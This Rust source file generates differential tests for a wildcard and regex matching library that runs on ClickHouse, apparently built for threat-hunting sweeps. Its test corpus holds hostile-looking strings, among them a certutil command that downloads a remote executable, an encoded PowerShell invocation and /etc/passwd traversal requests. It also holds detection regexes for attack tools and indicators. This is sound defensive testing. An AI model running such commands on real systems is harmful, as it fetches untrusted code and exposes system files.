// SPDX-License-Identifier: Apache-2.0
//! Differential-test generator: emits a corpus, generated ClickHouse SQL and
//! the results `wildcard-core` expects, as JSON on stdout. The runner
//! (`tests/differential/run.py`) executes the SQL in ClickHouse (chDB) and
//! compares. Usage: cargo run -p wildcard-ch --example difftest_gen [seed]

use libwildcard::antalya::{
    SweepItem, ViewColumns, candidate_predicate, column_predicate, sweep_queries, watchlist_mv,
    watchlist_table_ddl,
};
use libwildcard::core::View;
use libwildcard::core::indicator;
use libwildcard::core::verify::{Kind, Matcher};
use serde_json::json;

struct Rng(u64);
impl Rng {
    fn next(&mut self) -> u64 {
        self.0 ^= self.0 << 13;
        self.0 ^= self.0 >> 7;
        self.0 ^= self.0 << 17;
        self.0
    }
    fn pick<T: Copy>(&mut self, v: &[T]) -> T {
        v[(self.next() % v.len() as u64) as usize]
    }
}

fn hex(b: &[u8]) -> String {
    b.iter().map(|x| format!("{x:02X}")).collect()
}

const SECURITY: &[&str] = &[
    r"C:\Windows\System32\cmd.exe",
    r"\\Server\Share\Tools\Tool.EXE",
    r"C:\Temp\..\Windows\notepad.exe",
    "https://login.evil.com/wp-admin/setup.php",
    "http://LOGIN.EVIL.COM.:8080/%77p-ADMIN/x.PHP?a=1#f",
    "https://user:pass@sub.evil.com:443/path",
    "evil.com",
    "evil.com.",
    "evil.com/path?q",
    "https://evil.com.attacker.net/",
    "http://[2001:db8::1]:8080/x",
    "http://[::1]/",
    "host:notaport",
    "host:",
    "a@b@c.example.org",
    "GET /../../etc/passwd HTTP/1.1",
    "GET /%2e%2e/%2E%2E/etc/passwd",
    "%zz%4%41%",
    "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\PowerShell.EXE -EncodedCommand SQBFAFgA",
    "cmd.exe /c certutil -urlcache -split -f http://10.0.0.1/a.exe",
    "Mozilla/5.0 (compatible; sqlmap/1.7)",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0",
    "http://10.0.0.1:8080/",
    "110.0.0.12",
    "d41d8cd98f00b204e9800998ecf8427e.bin",
    "mailto:bad@evil.com",
    "https://xn--bcher-kva.example/bücher",
    "line1\nline2",
    "",
    "é",
    "aéb",
    "abcdgh",
    "abefgh",
    "abd",
    "acd",
    "run0.exe",
    "run9.exe",
    "ab0z",
    "xy9z",
    "Kxy",
    "CMD",
    "cd",
    "abababc",
];

fn main() {
    let seed: u64 = std::env::args()
        .nth(1)
        .and_then(|s| s.parse().ok())
        .unwrap_or(0x5eed);
    let mut r = Rng(seed | 1);
    let tokens: &[&[u8]] = &[
        b"a",
        b"b",
        b"c",
        b"A",
        b"C",
        b".",
        b"/",
        b"\\",
        b"%",
        b"2e",
        b"E",
        b"-",
        b"_",
        b" ",
        b"\n",
        b"\xff",
        "é".as_bytes(),
        b":",
        b"@",
        b"[",
        b"]",
        b"1",
        b"://",
        b"?",
    ];
    let mut values: Vec<Vec<u8>> = SECURITY.iter().map(|s| s.as_bytes().to_vec()).collect();
    for _ in 0..300 {
        let n = (r.next() % 10) as usize;
        values.push((0..n).flat_map(|_| r.pick(tokens).to_vec()).collect());
    }

    // 1. views
    let views: Vec<_> = View::ALL
        .iter()
        .map(|&v| {
            let expected: Vec<String> = values.iter().map(|x| hex(&v.apply(x))).collect();
            json!({"view": v.name(), "expr": libwildcard::antalya::view_expr("v", v), "expected": expected})
        })
        .collect();

    // 2. predicates
    let mut patterns: Vec<(Kind, String)> = vec![
        (Kind::Wildcard, "*/windows/system32/*.exe".into()),
        (Kind::Wildcard, "//server/share/*".into()),
        (Kind::Wildcard, r"C:\\Windows\\System32\\*".into()),
        (
            Kind::Regex {
                case_insensitive: false,
            },
            "^c:/windows/.*[.]exe$".into(),
        ),
        (Kind::Wildcard, "*/wp-admin/*.php".into()),
        (Kind::Like, "%../%".into()),
        (Kind::Like, "a_b".into()),
        (Kind::Like, "com.evil.%".into()),
        (Kind::Like, "%\\%%".into()),
        (Kind::Like, "%\\_%".into()),
        (Kind::Wildcard, "*?".into()),
        (
            Kind::Regex {
                case_insensitive: true,
            },
            r"powershell(\.exe)?\s+-e(nc|ncodedcommand)?\s".into(),
        ),
        (
            Kind::Regex {
                case_insensitive: false,
            },
            r"\b10\.0\.0\.1\b".into(),
        ),
        (
            Kind::Regex {
                case_insensitive: false,
            },
            r"^[a-z]+\.evil\.com$".into(),
        ),
        (
            Kind::Regex {
                case_insensitive: false,
            },
            r"line1.line2".into(),
        ),
        (
            Kind::Regex {
                case_insensitive: false,
            },
            r"\d+\.\d+".into(),
        ),
        (
            Kind::Regex {
                case_insensitive: true,
            },
            "(sqlmap|nikto|nuclei)".into(),
        ),
        (
            Kind::Regex {
                case_insensitive: false,
            },
            "a.b".into(),
        ),
        (
            Kind::Regex {
                case_insensitive: false,
            },
            "^.$".into(),
        ),
        (
            Kind::Regex {
                case_insensitive: false,
            },
            r"\w\W".into(),
        ),
    ];
    let atoms_like = ["a", "b", "c", "A", ".", "%", "_", "e", "2", "é", "/", ":"];
    let atoms_wc = ["a", "b", "C", ".", "*", "?", "e", "é", "/", "@"];
    let atoms_re = [
        "a", "b", "ab", "A", r"\.", "%2e", "[ab]", ".", "(a|bc)", "c?", "a+", "^", "$", r"\w",
        r"\d", r"\s", r"\b", "é", "[^a]", r"\S",
    ];
    for _ in 0..80 {
        let n = 1 + (r.next() % 5) as usize;
        patterns.push((Kind::Like, (0..n).map(|_| r.pick(&atoms_like)).collect()));
        patterns.push((Kind::Wildcard, (0..n).map(|_| r.pick(&atoms_wc)).collect()));
        let ci = r.next().is_multiple_of(2);
        patterns.push((
            Kind::Regex {
                case_insensitive: ci,
            },
            (0..n.min(4)).map(|_| r.pick(&atoms_re)).collect(),
        ));
    }
    for pattern in [
        "ab(cd|ef)gh",
        "a[bc]d",
        "run[0-3][.]exe",
        "^(ab|xy)[0-9]z$",
        "(?i:k)xy",
        "(ab|)cd",
        "[ab]{2,4}c",
    ] {
        for case_insensitive in [false, true] {
            patterns.push((Kind::Regex { case_insensitive }, pattern.into()));
        }
    }
    let cols = ViewColumns::new("v").unwrap();
    let mut preds = Vec::new();
    for (kind, pat) in &patterns {
        for &view in &View::ALL {
            let m = Matcher::new(*kind, pat, view).unwrap();
            let expected: Vec<usize> = values
                .iter()
                .enumerate()
                .filter(|(_, x)| m.is_match(x))
                .map(|(i, _)| i)
                .collect();
            let sql = column_predicate(&cols, *kind, pat, view).unwrap();
            for &id in &expected {
                let grams = libwildcard::core::grams::value_grams(view, &view.apply(&values[id]));
                assert!(
                    m.plan.eval_sorted(&grams),
                    "planner miss: {pat:?}, view {view}, id {id}"
                );
            }
            preds.push(json!({"kind": kind.to_string(), "pattern": pat, "view": view.name(), "sql": sql, "expected": expected}));
            if let Some(candidate) =
                candidate_predicate(&cols.expr(view), *kind, pat, view).unwrap()
            {
                preds.push(json!({"kind": format!("candidate+{}",kind), "pattern": pat, "view": view.name(), "sql": format!("({candidate}) AND ({sql})"), "expected": expected}));
            }
        }
    }

    // 3. sweep and watchlist from indicator specs
    let raw_indicators = [
        "evil[.]com",
        "hxxp://evil.com/wp-admin",
        "10.0.0.1",
        "d41d8cd98f00b204e9800998ecf8427e",
        "bad@evil.com",
        "sqlmap",
        "certutil",
        "bücher.example",
    ];
    let mut items = Vec::new();
    let mut expected_hits = Vec::new();
    for (i, raw) in raw_indicators.iter().enumerate() {
        let s = indicator::spec(raw);
        let id = 100 + i as i64;
        let m = Matcher::regex(&s.regex, s.view, false).unwrap();
        for (row, v) in values.iter().enumerate() {
            if m.is_match(v) {
                expected_hits.push(json!([row, id, s.view.name()]));
            }
        }
        items.push(SweepItem {
            id,
            view: s.view,
            regex: s.regex,
        });
    }
    let sweeps = sweep_queries("t", &["id"], &cols, &items, None, 200_000).unwrap();
    let watch_items: Vec<_> = items
        .iter()
        .map(|i| json!([i.id, i.view.name(), i.regex]))
        .collect();
    let mv = watchlist_mv("wc_mv", "src", "hits", "watch", &["id"], &cols, &View::ALL).unwrap();

    let out = json!({
        "values_hex": values.iter().map(|v| hex(v)).collect::<Vec<_>>(),
        "views": views,
        "predicates": preds,
        "sweep": {"queries": sweeps, "expected": expected_hits},
        "watchlist": {"table_ddl": watchlist_table_ddl("watch").unwrap(), "items": watch_items, "mv": mv},
    });
    println!("{out}");
}
